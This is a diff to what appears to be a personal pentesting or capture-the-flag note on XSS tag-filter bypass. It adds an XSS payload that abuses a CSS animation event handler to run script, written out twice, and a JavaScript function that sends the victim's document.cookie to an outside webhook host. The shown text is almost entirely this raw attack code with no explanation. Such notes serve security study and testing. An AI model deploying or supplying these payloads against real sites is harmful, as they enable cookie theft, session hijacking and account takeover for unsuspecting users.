@@ -20,3 +20,28 @@ Tag bypass:
 ![Pasted image 20261017214703](Attachments/Pasted%20image%2020261017214703.png)
 
 ![Pasted image 20261017214712](Attachments/Pasted%20image%2020261017214712.png)
+
+
+
+<style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationstart="print()"></b>
+
+
+```
+function exfil_by_rq_get(info_name, text) {
+  var xhttp = new XMLHttpRequest();
+  xhttp.open(
+    "GET",
+    "https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net" +
+      "/exfil_by_rq_get/" +
+      "c" +
+      "?" +
+      "c" +
+      "=" +
+      document.cookie,
+    true
+  );
+  xhttp.send()
+}
+```
+
+<style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationstart="print()"></b>
